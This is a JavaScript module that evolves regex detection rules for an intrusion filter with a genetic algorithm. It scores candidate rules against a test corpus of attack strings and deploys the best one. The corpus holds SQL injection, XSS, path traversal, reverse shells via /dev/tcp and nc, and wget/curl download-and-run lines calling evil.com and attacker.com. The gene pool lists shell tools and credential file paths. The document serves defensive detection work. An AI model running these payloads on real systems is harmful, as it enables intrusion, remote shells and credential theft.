const { injectSwarmRule } = require('./kineticFilter');
const { publishLiveEvent } = require('../memory_systems/memoryService');
const POPULATION_SIZE = 20;
const MAX_GENERATIONS = 10;
const MUTATION_RATE = 0.3;
const CROSSOVER_RATE = 0.7;
const ELITE_COUNT = 2;
const GENE_POOL = {
    quantifiers: ['+', '*', '{1,}', '{2,}', '?'],
    anchors: ['\\b', '^', '$'],
    charClasses: ['[a-zA-Z]', '[0-9]', '[\\x00-\\x1f]', '[^\\w]', '\\s', '\\S', '\\w', '\\W', '.'],
    escapes: ['\\/', '\\.', '\\-', '\\(', '\\)', '\\|', '\\\\'],
    groups: ['(?:', ')'],
    literals: [
        'select', 'union', 'drop', 'insert', 'delete', 'truncate', 'update',
        'exec', 'eval', 'system', 'cmd', 'powershell', 'bash', 'sh',
        'wget', 'curl', 'nc', 'ncat', 'base64', 'python', 'perl', 'ruby',
        'document\\.cookie', 'onerror', 'onload', 'javascript:',
        '\\.\\.\\/', '%2e%2e', '%00', '\\x00',
        '\\/etc\\/passwd', '\\/dev\\/tcp', '\\/bin\\/sh',
        'chmod', '\\+x', 'mkfifo', 'xargs'
    ],
    separators: ['|', '\\s+', '\\s*', '[\\s;|&]+']
};
const MALICIOUS_TEST_CORPUS = [
    "' OR 1=1 --",
    "'; DROP TABLE users;--",
    "UNION SELECT password FROM users",
    "<script>document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "../../etc/passwd",
    "; wget http://evil.com/shell.sh | bash",
    "curl http://attacker.com/payload -o /tmp/x && chmod +x /tmp/x",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "eval(atob('YWxlcnQoMSk='))",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "system('cat /etc/shadow')",
    "cmd.exe /c powershell -enc SQBFAHg=",
    "; mkfifo /tmp/f; nc -l 4444 < /tmp/f | /bin/sh > /tmp/f"
];
const BENIGN_TEST_CORPUS = [
    "Hello, how are you today?",
    "SELECT * FROM products WHERE id = 5",
    "The server is running on port 8080",
    "user logged in successfully from 192.168.1.1",
    "GET /api/v1/status HTTP/1.1",
    "Content-Type: application/json",
    "nginx/1.18.0 (Ubuntu)",
    "Connection reset by peer",
    "Memory usage: 45.2% of 32GB",
    "Backup completed at 2026-05-19 03:00:00"
];
const generateRandomIndividual = () => {
    const numFragments = 2 + Math.floor(Math.random() * 4);
    let pattern = '(?:';
    const selectedLiterals = [];
    for (let i = 0; i < numFragments; i++) {
        const literal = GENE_POOL.literals[Math.floor(Math.random() * GENE_POOL.literals.length)];
        if (!selectedLiterals.includes(literal)) {
            selectedLiterals.push(literal);
        }
    }
    pattern += selectedLiterals.join('|');
    pattern += ')';
    if (Math.random() > 0.5) {
        const anchor = GENE_POOL.anchors[Math.floor(Math.random() * GENE_POOL.anchors.length)];
        if (anchor === '\\b') {
            pattern = '\\b' + pattern;
        }
    }
    if (Math.random() > 0.7) {
        const charClass = GENE_POOL.charClasses[Math.floor(Math.random() * GENE_POOL.charClasses.length)];
        const quant = GENE_POOL.quantifiers[Math.floor(Math.random() * GENE_POOL.quantifiers.length)];
        pattern += '[\\s\\S]*?' + charClass + quant;
    }
    return pattern;
};
const evaluateFitness = (pattern) => {
    let regex;
    try {
        regex = new RegExp(pattern, 'i');
    } catch (e) {
        return { fitness: -1, tpr: 0, fpr: 0, latency: Infinity, valid: false };
    }
    let truePositives = 0;
    for (const sample of MALICIOUS_TEST_CORPUS) {
        if (regex.test(sample)) truePositives++;
    }
    const tpr = truePositives / MALICIOUS_TEST_CORPUS.length;
    let falsePositives = 0;
    for (const sample of BENIGN_TEST_CORPUS) {
        if (regex.test(sample)) falsePositives++;
    }
    const fpr = falsePositives / BENIGN_TEST_CORPUS.length;
    const start = process.hrtime.bigint();
    const iterations = 1000;
    for (let i = 0; i < iterations; i++) {
        regex.test(MALICIOUS_TEST_CORPUS[i % MALICIOUS_TEST_CORPUS.length]);
    }
    const elapsed = Number(process.hrtime.bigint() - start) / 1e6;
    const avgLatencyMs = elapsed / iterations;
    const latencyPenalty = avgLatencyMs > 0.05 ? (avgLatencyMs - 0.05) * 10 : 0;
    const fitness = (tpr * 100) - (fpr * 50) - latencyPenalty;
    return { fitness, tpr, fpr, latency: avgLatencyMs, valid: true };
};
const crossover = (parent1, parent2) => {
    if (Math.random() > CROSSOVER_RATE) return parent1;
    const extractLiterals = (p) => {
        const match = p.match(/\(\?:([^)]+)\)/);
        return match ? match[1].split('|') : [p];
    };
    const genes1 = extractLiterals(parent1);
    const genes2 = extractLiterals(parent2);
    const crossPoint = Math.floor(Math.random() * genes1.length);
    const childGenes = [
        ...genes1.slice(0, crossPoint),
        ...genes2.slice(crossPoint)
    ];
    const uniqueGenes = [...new Set(childGenes)].slice(0, 6);
    let child = '(?:' + uniqueGenes.join('|') + ')';
    return child;
};
const mutate = (pattern) => {
    if (Math.random() > MUTATION_RATE) return pattern;
    const mutationType = Math.floor(Math.random() * 3);
    if (mutationType === 0) {
        const newGene = GENE_POOL.literals[Math.floor(Math.random() * GENE_POOL.literals.length)];
        pattern = pattern.replace(')', '|' + newGene + ')');
    } else if (mutationType === 1) {
        const match = pattern.match(/\(\?:([^)]+)\)/);
        if (match) {
            const genes = match[1].split('|');
            if (genes.length > 1) {
                genes.splice(Math.floor(Math.random() * genes.length), 1);
                pattern = '(?:' + genes.join('|') + ')';
            }
        }
    } else {
        if (Math.random() > 0.5 && !pattern.startsWith('\\b')) {
            pattern = '\\b' + pattern;
        } else {
            const suffix = GENE_POOL.charClasses[Math.floor(Math.random() * GENE_POOL.charClasses.length)];
            pattern = pattern + suffix + '+';
        }
    }
    return pattern;
};
const evolveKineticRules = async(anomalyContext = "Unknown Anomaly") => {
    console.log(`\n[🧬] =============================================`);
    console.log(`[🧬] KINETIC EVOLVER: Genetic Algorithm Activated`);
    console.log(`[🧬] Anomaly Context: ${anomalyContext}`);
    console.log(`[🧬] =============================================\n`);
    let population = [];
    for (let i = 0; i < POPULATION_SIZE; i++) {
        population.push(generateRandomIndividual());
    }
    let bestEver = { pattern: '', fitness: -Infinity, tpr: 0, fpr: 0, latency: 0 };
    for (let gen = 1; gen <= MAX_GENERATIONS; gen++) {
        const evaluated = population.map(pattern => {
            const result = evaluateFitness(pattern);
            return { pattern, ...result };
        }).filter(e => e.valid);
        evaluated.sort((a, b) => b.fitness - a.fitness);
        const best = evaluated[0];
        if (best && best.fitness > bestEver.fitness) {
            bestEver = {...best };
        }
        console.log(`[🧬] Gen ${gen}/${MAX_GENERATIONS} | Best Fitness: ${best.fitness.toFixed(2)} | TPR: ${(best.tpr * 100).toFixed(0)}% | FPR: ${(best.fpr * 100).toFixed(0)}% | Latency: ${best.latency.toFixed(4)}ms`);
        const newPopulation = [];
        for (let i = 0; i < ELITE_COUNT && i < evaluated.length; i++) {
            newPopulation.push(evaluated[i].pattern);
        }
        while (newPopulation.length < POPULATION_SIZE) {
            const tournament = [];
            for (let t = 0; t < 3; t++) {
                tournament.push(evaluated[Math.floor(Math.random() * evaluated.length)]);
            }
            tournament.sort((a, b) => b.fitness - a.fitness);
            const parent1 = tournament[0].pattern;
            const tournament2 = [];
            for (let t = 0; t < 3; t++) {
                tournament2.push(evaluated[Math.floor(Math.random() * evaluated.length)]);
            }
            tournament2.sort((a, b) => b.fitness - a.fitness);
            const parent2 = tournament2[0].pattern;
            let child = crossover(parent1, parent2);
            child = mutate(child);
            try {
                new RegExp(child, 'i');
                newPopulation.push(child);
            } catch (e) {
                newPopulation.push(generateRandomIndividual());
            }
        }
        population = newPopulation;
    }
    if (bestEver.fitness > 20 && bestEver.tpr > 0.3) {
        const ruleName = `KineticEvolver-${Date.now()}-${anomalyContext.replace(/\s+/g, '_').substring(0, 30)}`;
        console.log(`\n[🏆] KINETIC EVOLVER: Champion Rule Found!`);
        console.log(`    Pattern: ${bestEver.pattern}`);
        console.log(`    Fitness: ${bestEver.fitness.toFixed(2)}`);
        console.log(`    TPR: ${(bestEver.tpr * 100).toFixed(0)}% | FPR: ${(bestEver.fpr * 100).toFixed(0)}%`);
        console.log(`    Avg Latency: ${bestEver.latency.toFixed(4)}ms`);
        const rule = {
            rule_name: ruleName,
            regex_pattern: bestEver.pattern,
            explanation: `Autonomously synthesized by Genetic Algorithm (Gen ${MAX_GENERATIONS}, Pop ${POPULATION_SIZE}) for anomaly: ${anomalyContext}. TPR: ${(bestEver.tpr * 100).toFixed(0)}%, FPR: ${(bestEver.fpr * 100).toFixed(0)}%, Latency: ${bestEver.latency.toFixed(4)}ms.`
        };
        injectSwarmRule(rule);
        try {
            await publishLiveEvent('bayezid_tactical_feed', 'KINETIC_RULE_EVOLVED', {
                rule: rule,
                fitness: bestEver.fitness,
                generation: MAX_GENERATIONS
            });
        } catch (e) {}
        console.log(`[✔] KINETIC EVOLVER: Rule deployed to Kinetic Filter (zero-restart hot-reload).\n`);
        return rule;
    } else {
        console.log(`\n[⚠️] KINETIC EVOLVER: No sufficiently fit rule found (Best: ${bestEver.fitness.toFixed(2)}). No deployment.`);
        return null;
    }
};
module.exports = { evolveKineticRules };